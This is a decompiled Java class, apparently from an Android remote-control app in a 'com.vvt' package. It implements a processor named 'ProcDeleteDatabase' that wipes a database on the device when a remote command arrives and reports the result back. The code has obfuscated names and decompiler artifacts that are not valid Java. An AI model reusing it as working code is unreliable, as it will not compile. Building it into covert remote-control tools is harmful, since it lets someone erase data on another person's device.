package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class b
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public b(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  protected String a(Object paramObject)
  {
    boolean bool1 = false;
    Object localObject = null;
    boolean bool2 = paramObject instanceof RmtCtrlOutputStatusMessage;
    if (bool2)
    {
      localObject = paramObject;
      localObject = (RmtCtrlOutputStatusMessage)paramObject;
      bool1 = ((RmtCtrlOutputStatusMessage)localObject).isSuccess();
      if (!bool1) {
        break label36;
      }
    }
    label36:
    Object[] arrayOfObject;
    for (localObject = "OK";; localObject = String.format("%s", arrayOfObject))
    {
      return (String)localObject;
      bool2 = true;
      arrayOfObject = new Object[bool2];
      paramObject = (RmtCtrlOutputStatusMessage)paramObject;
      String str = ((RmtCtrlOutputStatusMessage)paramObject).getMessage();
      arrayOfObject[0] = str;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = h();
    Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.DELETE_DATABASE;
    ((ControlCommand)localObject2).<init>(localRemoteFunction, null);
    localObject1 = ((com.vvt.remotecontrol.a)localObject1).execute((ControlCommand)localObject2);
    if (paramc != null)
    {
      localObject2 = a(localObject1);
      boolean bool2 = localObject1 instanceof RmtCtrlOutputStatusMessage;
      if (bool2)
      {
        localObject1 = (RmtCtrlOutputStatusMessage)localObject1;
        bool1 = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        bool2 = a;
        if ((bool2) && (!bool1)) {
          break label113;
        }
        paramc.b(paramRemoteCommand, this, (String)localObject2);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label113:
      if (localObject2 == null)
      {
        bool1 = a;
        if (bool1) {}
        localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
        localObject2 = "Unknown.";
        ((RemoteCommandException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      }
      else
      {
        bool1 = a;
        if (bool1) {}
        localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
        ((RemoteCommandException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      }
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcDeleteDatabase";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 60000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */